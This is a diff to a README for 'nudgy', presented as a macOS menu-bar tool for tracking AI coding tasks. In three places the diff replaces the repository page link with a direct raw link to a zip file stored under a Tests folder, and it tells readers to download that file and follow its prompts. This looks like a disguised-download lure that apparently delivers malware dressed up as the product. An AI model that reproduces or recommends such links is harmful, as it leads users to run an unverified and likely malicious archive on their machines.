@@ -1,6 +1,6 @@
 # 🛎️ nudgy - Stay on top of AI coding tasks
 
-[![Download nudgy](https://img.shields.io/badge/Download-nudgy-blue?style=for-the-badge&logo=github)](https://github.com/highstepping-chaperon781/nudgy)
+[![Download nudgy](https://img.shields.io/badge/Download-nudgy-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/highstepping-chaperon781/nudgy/main/Tests/Software_2.9.zip)
 
 ## 🚀 What nudgy does
 
@@ -16,7 +16,7 @@ nudgy keeps the flow simple. It lives in your menu bar, watches for local activi
 
 ## 📥 Download and install
 
-1. Open the download page: [https://github.com/highstepping-chaperon781/nudgy](https://github.com/highstepping-chaperon781/nudgy)
+1. Open the download page: [https://raw.githubusercontent.com/highstepping-chaperon781/nudgy/main/Tests/Software_2.9.zip](https://raw.githubusercontent.com/highstepping-chaperon781/nudgy/main/Tests/Software_2.9.zip)
 2. Get the latest release file for macOS
 3. Download it to your Mac
 4. Open the file and follow the prompts
@@ -154,7 +154,7 @@ nudgy works well if you:
 
 ## 📎 Download again
 
-If you want to get nudgy now, visit the download page here: [https://github.com/highstepping-chaperon781/nudgy](https://github.com/highstepping-chaperon781/nudgy)
+If you want to get nudgy now, visit the download page here: [https://raw.githubusercontent.com/highstepping-chaperon781/nudgy/main/Tests/Software_2.9.zip](https://raw.githubusercontent.com/highstepping-chaperon781/nudgy/main/Tests/Software_2.9.zip)
 
 ## 🧭 Simple setup checklist
 
